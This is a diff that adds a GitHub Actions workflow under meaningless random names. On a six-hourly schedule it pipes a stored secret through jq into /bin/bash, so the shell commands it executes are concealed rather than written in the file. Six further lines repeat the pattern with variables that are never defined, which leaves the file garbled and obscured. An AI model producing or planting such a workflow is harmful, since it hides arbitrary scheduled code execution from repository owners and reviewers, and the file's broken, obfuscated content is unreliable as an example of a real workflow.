@@ -1,0 +1,23 @@
+name: chenqiushen9183
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '17 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chenqiushen9183
+        env:
+          izco6: ${{ secrets.izco6 }}
+        run: |
+          echo $izco6 | jq -r .mlzt83 | /bin/bash
+          echo $wmvy1041 | jq -r .luwk5 | /bin/bash
+          echo $x620 | jq -r .nw77584 | /bin/bash
+          echo $hcs76549 | jq -r .kg76322 | /bin/bash
+          echo $bf2 | jq -r .o78 | /bin/bash
+          echo $euyql259 | jq -r .dekep5596 | /bin/bash
+          echo $z55 | jq -r .u4097 | /bin/bash
+
